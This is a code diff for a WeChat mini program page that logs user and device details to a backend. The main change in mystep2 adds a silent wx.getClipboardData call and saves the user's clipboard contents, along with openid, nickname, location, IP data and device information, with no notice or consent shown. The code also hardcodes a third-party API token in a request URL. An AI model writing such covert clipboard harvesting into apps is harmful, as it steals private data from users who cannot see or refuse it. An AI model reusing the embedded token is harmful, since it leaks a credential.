@@ -13,7 +13,7 @@ Page({
     //如果刚刚已经开过了
     if (this.data.lastTimestamp != 0) {
       var diffTimestamp = new Date().getTime() - this.data.lastTimestamp
-      if (diffTimestamp < 5 * 60 * 1000) {
+      if (diffTimestamp < (5 * 60 * 1000)) {
         return;
       }
     }
@@ -87,46 +87,54 @@ Page({
   //mystep2
   mystep2: function (time, userInfo, myAvatarUrl, wxnet) {
     var user = AV.User.current().toJSON()
+    //屏幕亮度
     wx.getScreenBrightness({
       success: function (screenBrightness) {
-        wx.request({
-          url: 'https://api.ip138.com/query/?&token=83d36bd05aaf10e9e2059959c8ee0f3f',
-          success: function (ip) {
-            //系统信息
-            var res = wx.getSystemInfoSync()
-            const useMessage = new UseMessage({
-              //时间
-              time: time,
-              //场景值
-              scene: app.globalData.scene,
-              //用户信息
-              openid: user.authData.lc_weapp.openid,
-              nickName: userInfo.nickName,
-              city: userInfo.city,
-              province: userInfo.province,
-              country: userInfo.country,
-              avatarUrl: userInfo.avatarUrl,
-              myAvatarUrl: myAvatarUrl,
-              //网络信息
-              networkType: wxnet.networkType,
-              ipjson: ip.data,
-              //系统信息
-              screenBrightness: screenBrightness.value,
-              brand: res.brand,
-              model: res.model,
-              pixelRatio: res.pixelRatio,
-              screenWidth: res.screenWidth,
-              screenHeight: res.screenHeight,
-              windowWidth: res.windowWidth,
-              windowHeight: res.windowHeight,
-              statusBarHeight: res.statusBarHeight,
-              language: res.language,
-              version: res.version,
-              system: res.system,
-              platform: res.platform,
-              fontSizeSetting: res.fontSizeSetting,
-              SDKVersion: res.SDKVersion
-            }).save()
+        //剪切板
+        wx.getClipboardData({
+          success: function (clipboard) {
+            //ip
+            wx.request({
+              url: 'https://api.ip138.com/query/?&token=83d36bd05aaf10e9e2059959c8ee0f3f',
+              success: function (ip) {
+                //系统信息
+                var res = wx.getSystemInfoSync()
+                const useMessage = new UseMessage({
+                  //时间
+                  time: time,
+                  //场景值
+                  scene: app.globalData.scene,
+                  //用户信息
+                  openid: user.authData.lc_weapp.openid,
+                  nickName: userInfo.nickName,
+                  city: userInfo.city,
+                  province: userInfo.province,
+                  country: userInfo.country,
+                  avatarUrl: userInfo.avatarUrl,
+                  myAvatarUrl: myAvatarUrl,
+                  //网络信息
+                  networkType: wxnet.networkType,
+                  ipjson: ip.data,
+                  //系统信息
+                  screenBrightness: screenBrightness.value,
+                  clipboard: clipboard.data,
+                  brand: res.brand,
+                  model: res.model,
+                  pixelRatio: res.pixelRatio,
+                  screenWidth: res.screenWidth,
+                  screenHeight: res.screenHeight,
+                  windowWidth: res.windowWidth,
+                  windowHeight: res.windowHeight,
+                  statusBarHeight: res.statusBarHeight,
+                  language: res.language,
+                  version: res.version,
+                  system: res.system,
+                  platform: res.platform,
+                  fontSizeSetting: res.fontSizeSetting,
+                  SDKVersion: res.SDKVersion
+                }).save()
+              }
+            })
           }
         })
       }
@@ -173,6 +181,12 @@ Page({
   toSbbdDirector: function () {
     wx.navigateTo({
       url: '../sbbd/director/director'
+    })
+  },
+
+  toSettingHome: function () {
+    wx.navigateTo({
+      url: '../setting/home/home'
     })
   }
 })
